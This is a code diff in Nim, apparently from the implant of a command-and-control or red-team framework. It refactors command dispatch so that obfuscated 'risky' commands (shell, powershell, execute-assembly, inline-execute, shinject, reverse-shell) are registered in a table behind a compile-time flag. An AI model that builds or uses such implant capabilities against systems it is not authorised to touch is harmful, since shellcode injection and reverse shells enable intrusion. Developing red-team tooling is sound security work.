@@ -56,9 +56,22 @@ var dispatcher = {
   obf("whoami"): CommandDispatch(handlerEmpty: whoami)
 }.toTable
 
+var dispatcherRisky = {
+    obf("execute-assembly"): CommandDispatch(handlerWithListener: executeAssembly),
+    obf("inline-execute"): CommandDispatch(handlerWithListener: inlineExecute),
+    obf("powershell"): CommandDispatch(handler: powershell),
+    obf("shell"): CommandDispatch(handler: shell),
+    obf("shinject"): CommandDispatch(handlerWithListener: shinject),
+    obf("reverse-shell"): CommandDispatch(handler: reverseShell)
+}.toTable
+
+when defined risky:
+    for k, v in dispatcherRisky:
+        dispatcher[k] = v
+
 # Parse user commands that do not affect the listener object here
 proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =
-    echo obf("DEBUG: Parsing command: ") & cmd
+
     try:
         # Parse the received command
         let dispatch = dispatcher.getOrDefault(cmd, CommandDispatch())
@@ -71,24 +84,7 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
         elif dispatch.handler != nil:
             return dispatch.handler(args)
         else:
-            # Parse risky commands, if enabled
-            when defined risky:
-                if cmd == obf("execute-assembly"):
-                    result = executeAssembly(li, args)
-                elif cmd == obf("inline-execute"):
-                    result = inlineExecute(li, args)
-                elif cmd == obf("powershell"):
-                    result = powershell(args)
-                elif cmd == obf("shell"):
-                    result = shell(args)
-                elif cmd == obf("shinject"):
-                    result = shinject(li, args)
-                elif cmd == obf("reverse-shell"):
-                    result = reverseShell(args)
-                else:
-                    result = obf("ERROR: An unknown command was received.")
-            else:
-                result = obf("ERROR: An unknown command was received.")
+            result = obf("ERROR: An unknown command was received.")
     
     # Catch unhandled exceptions during command execution (commonly OS exceptions)
     except:
